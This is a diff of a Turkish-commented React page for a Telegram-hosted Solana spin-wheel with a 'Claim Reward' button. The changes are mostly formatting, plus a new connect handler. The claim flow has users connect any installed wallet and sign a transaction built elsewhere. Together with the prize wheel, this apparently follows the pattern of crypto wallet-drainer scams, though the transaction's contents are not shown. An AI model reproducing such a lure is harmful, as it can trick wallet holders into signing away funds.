@@ -12,7 +12,6 @@ import type { WalletAdapter, WalletName } from '@solana/wallet-adapter-base'
 import { WalletReadyState } from '@solana/wallet-adapter-base'
 import { createUnsignedTransaction } from '@/app/services/transaction'
 
-
 // ——— Telegram WebApp tipi ———
 interface TgWebApp {
   expand: () => void
@@ -45,7 +44,7 @@ export default function Page() {
     }
   }, [])
 
-  /* ——— Çark (spin) durumu ——— */
+  /* ——— Çark durumu ——— */
   const wheelRef = useRef<HTMLImageElement>(null)
   const [hasSpun, setHasSpun] = useState<boolean>(
     () =>
@@ -72,13 +71,7 @@ export default function Page() {
 
   /* ——— Wallet & Drawer kontrolü ——— */
   const { connection: conn } = useConnection()
-  const {
-    wallet,
-    wallets,
-    select,
-    publicKey,
-    sendTransaction,
-  } = useWallet()
+  const { wallet, wallets, select, publicKey, sendTransaction } = useWallet()
   const [drawerOpen, setDrawerOpen] = useState(false)
   const [loading,    setLoading]    = useState(false)
   const [msg,        setMsg]        = useState('')
@@ -90,65 +83,32 @@ export default function Page() {
   const origin = typeof window !== 'undefined' ? window.location.origin : ''
   const dappUrl = encodeURIComponent(origin)
 
-  /* ——— Phantom deeplink fonksiyonu ——— */
+  /* ——— Phantom deeplink ——— */
   const openPhantomBrowser = () => {
     const universal = `https://phantom.app/ul/browse/${dappUrl}?ref=${dappUrl}`
     window.open(universal, '_blank')
   }
 
-  /* ——— Wallet yapılandırmaları & sıralama ——— */
+  /* ——— Cüzdan yapılandırmaları ——— */
   interface WalletConfig {
-    match: (adapterName: string) => boolean
+    match: (name: string) => boolean
     label: string
     icon: string
     deepLink: string
   }
   const walletConfigs: WalletConfig[] = [
-    {
-      match: (n) => n === 'Phantom',
-      label: 'Phantom',
-      icon: '/phantom.svg',
-      deepLink: `https://phantom.app/ul/browse/${dappUrl}?ref=${dappUrl}`,
-    },
-    {
-      match: (n) => n.toLowerCase().includes('trust'),
-      label: 'Trust Wallet',
-      icon: '/trustwallet.svg',
-      deepLink: `https://link.trustwallet.com/open_url?url=${dappUrl}`,
-    },
-    {
-      match: (n) => n.toLowerCase().includes('coinbase'),
-      label: 'Coinbase Wallet',
-      icon: '/coinbase.svg',
-      deepLink: `https://go.cb-w.com/dapp?cb_url=${dappUrl}`,
-    },
-    {
-      match: (n) =>
-        n.toLowerCase().includes('bitkeep') ||
-        n.toLowerCase().includes('bitget'),
-      label: 'Bitget Wallet',
-      icon: '/bitget.svg',
-      deepLink: `bitkeep://bkconnect?action=dapp&url=${dappUrl}`,
-    },
-    {
-      match: (n) => n === 'Solflare',
-      label: 'Solflare',
-      icon: '/solflare.svg',
-      deepLink: `https://solflare.com/ul/v1/browse/${dappUrl}?ref=${dappUrl}`,
-    },
-    {
-      match: (n) => n === 'Backpack',
-      label: 'Backpack',
-      icon: '/backpack.svg',
-      deepLink: `https://backpack.app/ul/v1/browse/${dappUrl}?ref=${dappUrl}`,
-    },
+    { match: (n) => n === 'Phantom', label: 'Phantom', icon: '/phantom.svg', deepLink: `https://phantom.app/ul/browse/${dappUrl}?ref=${dappUrl}` },
+    { match: (n) => n.toLowerCase().includes('trust'), label: 'Trust Wallet', icon: '/trustwallet.svg', deepLink: `https://link.trustwallet.com/open_url?url=${dappUrl}` },
+    { match: (n) => n.toLowerCase().includes('coinbase'), label: 'Coinbase Wallet', icon: '/coinbase.svg', deepLink: `https://go.cb-w.com/dapp?cb_url=${dappUrl}` },
+    { match: (n) => n.toLowerCase().includes('bitkeep') || n.toLowerCase().includes('bitget'), label: 'Bitget Wallet', icon: '/bitget.svg', deepLink: `bitkeep://bkconnect?action=dapp&url=${dappUrl}` },
+    { match: (n) => n === 'Solflare', label: 'Solflare', icon: '/solflare.svg', deepLink: `https://solflare.com/ul/v1/browse/${dappUrl}?ref=${dappUrl}` },
+    { match: (n) => n === 'Backpack', label: 'Backpack', icon: '/backpack.svg', deepLink: `https://backpack.app/ul/v1/browse/${dappUrl}?ref=${dappUrl}` },
   ]
 
   type DrawerWallet = WalletConfig & {
     adapter: WalletAdapter
     readyState: WalletReadyState
   }
-
   const mappedWallets = walletConfigs.map((cfg) => {
     const w = wallets.find((w) => cfg.match(w.adapter.name))
     return w ? { adapter: w.adapter, readyState: w.readyState, ...cfg } : null
@@ -156,6 +116,31 @@ export default function Page() {
   const orderedWallets: DrawerWallet[] = mappedWallets.filter(
     (x): x is DrawerWallet => x !== null
   )
+
+  /* ——— Connect Wallet ——— */
+  const handleConnect = async () => {
+    setLoading(true)
+    setMsg('')
+    // Zaten bağlıysa
+    if (publicKey) {
+      setLoading(false)
+      return
+    }
+    // Tek bir installed adapter varsa doğrudan bağla
+    const installed = orderedWallets.filter(
+      (w) => w.readyState === WalletReadyState.Installed
+    )
+    if (installed.length === 1) {
+      try {
+        await select(installed[0].adapter.name as WalletName)
+      } catch (e) {
+        console.error(e)
+      }
+    } else {
+      openDrawer()
+    }
+    setLoading(false)
+  }
 
   /* ——— Transaction gönderme ——— */
   const doTx = async () => {
@@ -167,7 +152,6 @@ export default function Page() {
         setMsg('Claim failed')
         return
       }
-
       let signature: string
       if (wallet?.adapter && 'signAndSendTransaction' in wallet.adapter) {
         const res = await (wallet.adapter as any).signAndSendTransaction(tx, conn)
@@ -175,7 +159,6 @@ export default function Page() {
       } else {
         signature = await sendTransaction(tx, conn)
       }
-
       await conn.confirmTransaction(signature, 'confirmed')
       setMsg('Claim successful')
     } catch (e: any) {
@@ -187,32 +170,33 @@ export default function Page() {
     }
   }
 
-  /* ——— Claim butonu ——— */
+  /* ——— Claim Reward ——— */
   const handleClaim = async () => {
-    // 1) Zaten bağlıysak direkt işlem
+    setLoading(true)
+    setMsg('')
+    // Zaten bağlıysa
     if (publicKey) {
-      return doTx()
+      await doTx()
+      setLoading(false)
+      return
     }
-
-    // 2) Sadece bir adet "Installed" adapter varsa → otomatik select + tx
+    // Tek bir installed adapter varsa bağlanıp tx iste
     const installed = orderedWallets.filter(
       (w) => w.readyState === WalletReadyState.Installed
     )
     if (installed.length === 1) {
-      setLoading(true)
       try {
         await select(installed[0].adapter.name as WalletName)
         await doTx()
       } catch (e) {
         console.error(e)
-      } finally {
-        setLoading(false)
       }
+      setLoading(false)
       return
     }
-
-    // 3) Diğer durumlarda modal göster
+    // Diğer durumlarda modal aç
     openDrawer()
+    setLoading(false)
   }
 
   /* ——— Cüzdan seçimi ——— */
